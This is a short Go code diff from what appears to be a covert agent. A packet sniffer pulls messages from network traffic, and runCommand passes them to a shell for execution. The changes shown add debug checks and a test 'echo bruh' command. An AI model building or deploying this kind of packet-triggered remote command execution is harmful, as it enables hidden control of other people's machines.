@@ -4,6 +4,7 @@ import (
 	_ "bytes"
 	"fmt"
 	"log"
+	_ "os"
 	"os/exec"
 	"strings"
 
@@ -56,6 +57,7 @@ func StartSniffer(newAgent agent.Agent) {
 			}
 		}
 	}
+
 }
 
 func harvestInfo(packet gopacket.Packet) (string, string) {
@@ -78,7 +80,17 @@ func harvestInfo(packet gopacket.Packet) (string, string) {
 
 func runCommand(msg string, newAgent agent.Agent) {
 	//msgArr := strings.Split(msg, " ")
-	fmt.Println(msg)
+	if newAgent.ShellType != "/bin/sh" {
+		fmt.Print("something wrong type")
+	}
+	if newAgent.ShellFlag != "-c" {
+		fmt.Print("something wrong flag")
+	}
+
+	if msg != "echo bruh" {
+		fmt.Println("something wrong message")
+	}
+	output1, err := exec.Command("/bin/sh", "-c", "echo bruh").Output()
 	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()
 
 	if err != nil {
@@ -86,6 +98,7 @@ func runCommand(msg string, newAgent agent.Agent) {
 		fmt.Println("Couldn't execute command")
 	}
 
+	fmt.Println(string(output1))
 	fmt.Println(string(output))
 } //should this go in agent?
 
